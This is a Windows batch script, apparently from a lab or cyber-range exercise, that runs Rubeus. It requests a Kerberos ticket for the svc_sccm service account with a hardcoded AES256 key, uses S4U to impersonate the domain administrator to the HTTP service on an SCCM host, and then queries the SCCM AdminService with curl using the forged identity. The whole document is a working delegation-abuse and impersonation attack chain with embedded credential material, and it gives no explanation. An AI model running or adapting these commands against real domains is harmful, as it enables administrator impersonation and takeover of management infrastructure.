@echo off
set RB=C:\Tools\ADTools\Rubeus.exe
set MP=mbr02.range.local
set K=C:\Windows\Temp\svc_sccm_tgt.kirbi
echo === ASKTGT (svc_sccm, AES256) ===
%RB% asktgt /user:svc_sccm /aes256:54D4BFDC9CD3B8885E6EEE6AA2AC04058C80D57D13EA70708CF7ABECB1927012 /domain:range.local /dc:dc03.range.local /ptt /nowrap /outfile:%K%
echo === S4U (administrator -> HTTP/mbr02.range.local) ===
%RB% s4u /ticket:%K% /impersonateuser:administrator /msdsspn:HTTP/mbr02.range.local /dc:dc03.range.local /ptt /nowrap
echo === CURL PRESENT ===
curl.exe -k -s -o NUL -w "ANON:%%{http_code}\n" https://%MP%/AdminService/v1.0/
curl.exe -k -s --negotiate -u : -o NUL -w "ST:%%{http_code}\n" https://%MP%/AdminService/wmi/SMS_Site
echo === SMS_Site body ===
curl.exe -k -s --negotiate -u : https://%MP%/AdminService/wmi/SMS_Site
echo.
echo === CD_DONE ===
